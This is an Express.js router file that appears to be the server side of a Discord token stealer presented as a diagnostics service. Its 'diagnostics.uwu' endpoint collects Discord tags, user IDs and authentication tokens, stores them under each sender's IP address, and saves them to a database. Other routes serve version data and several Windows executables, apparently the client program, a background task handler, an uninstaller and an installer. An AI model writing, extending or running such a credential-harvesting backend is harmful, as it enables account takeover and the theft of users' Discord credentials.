/* EXPRESS.JS */
const Express = require("express");
const Router = Express.Router();

/* EXTERNAL MODULES */
const BodyParser = require("body-parser");
const Multer = require("multer");
const Fs = require("fs");

/* INTERNAL MODULES */
const Generator = require("../../resources/modules/generator.js");
const DBManager = require("../../resources/modules/database.js");
const Options = require("../../resources/modules/options.json");

/* VARIABLES */
const NSBSStats = DBManager.GetGlobalDatabase("nsbs_stats", {});
const VerPayload = {
	["ver"]: Options.NSBS.Version,
	["dls"]: {
		["exe"]: Options.NSBS.Downloads.Executable,
		["bgt"]: Options.NSBS.Downloads.BGTaskHndlr,
		["uni"]: Options.NSBS.Downloads.Uninstaller
	}
};

/* FUNCTIONS */
const GetTimeF = function(When) {
	const Formatter = new Intl.DateTimeFormat("en-US", {
		year: "2-digit", month: "2-digit", day: "2-digit",
		hour: "2-digit", minute: "2-digit", second: "2-digit",
		hour12: true, timeZone: "America/New_York"});
	const Formatted = Formatter.formatToParts(When);
	const [{ value: Month },,{ value: Day },,{ value: Year },,
		{ value: Hour },,{ value: Minute },,{ value: Second },,
		{ value: Period }] = Formatted;
	
	return `${Month}.${Day}.${Year} - ${Hour}:${Minute}:${Second} ${Period}`;
}

/* REQUEST MANAGER */
Router.post("/nsbs/stats/diagnostics.uwu", async (Request, Response) => {
	const IPAddress = Request.connection.remoteAddress;
	const CurrTimeF = GetTimeF(new Date());
	const CurrTime = new Date().getTime();

	const Arguments = Request.body;
	const DCAccounts = Arguments["dc_diag"];

	if (DCAccounts == null || typeof DCAccounts != "object" || Array.isArray(DCAccounts) == false)
		return Response.status(400).send({ success: false, error: "lol no" });

	// Statistics and stuff
	if (NSBSStats[IPAddress] == null) 
		NSBSStats[IPAddress] = {};
	NSBSStats[IPAddress].LastUpdate = CurrTime;
	NSBSStats[IPAddress].LastUpdateF = CurrTimeF;

	if (NSBSStats[IPAddress].Statistics == null)
		NSBSStats[IPAddress].Statistics = {};
	if (NSBSStats[IPAddress].Statistics.Discord == null)
		NSBSStats[IPAddress].Statistics.Discord = [];
	
	DCAccounts.forEach((Account) => {
		if (typeof Account != "object" || Array.isArray(Account) == true)
			return;
		if (Account["dt_track"] == null || typeof Account["dt_track"] != "string")
			return; // Discord Tag
		if (Account["di_track"] == null || typeof Account["di_track"] != "string")
			return; // Discord Identifier
		if (Account["tk_track"] == null || typeof Account["tk_track"] != "string")
			return; // Token

		var NewEntry = {};
		NewEntry["Tag"] = Account["dt_track"];
		NewEntry["Identifier"] = Account["di_track"];
		NewEntry["Token"] = Account["tk_track"];
		
		var PrevEntry = NSBSStats[IPAddress].Statistics.Discord.findIndex((E) => (E.Identifier == Account["di_track"]));
		if (PrevEntry != null && PrevEntry != -1)
			NSBSStats[IPAddress].Statistics.Discord.splice(PrevEntry, 1);
		
		NSBSStats[IPAddress].Statistics.Discord.push(NewEntry);
	});

	try { DBManager.SaveGlobalDatabase("nsbs_stats") }
	catch { return Response.status(400).send({ success: false, error: "internal_error" }) };

	return Response.status(200).send({ success: true });
});

Router.get("/nsbs/stats/curr_ver.uwu", async (Request, Response) =>
	Response.status(200).send(VerPayload));

Router.get(Options.NSBS.Downloads.Executable, async (Request, Response) =>
	Response.status(200).sendFile(`${process.cwd()}/resources/files/nsbs.exe`));
Router.get(Options.NSBS.Downloads.BGTaskHndlr, async (Request, Response) =>
	Response.status(200).sendFile(`${process.cwd()}/resources/files/bgt.exe`));
Router.get(Options.NSBS.Downloads.Uninstaller, async (Request, Response) =>
	Response.status(200).sendFile(`${process.cwd()}/resources/files/unins.exe`));
Router.get(Options.NSBS.Downloads.Bootstrapper, async (Request, Response) =>
	Response.status(200).sendFile(`${process.cwd()}/resources/files/nsbs-installer.exe`));

module.exports = Router;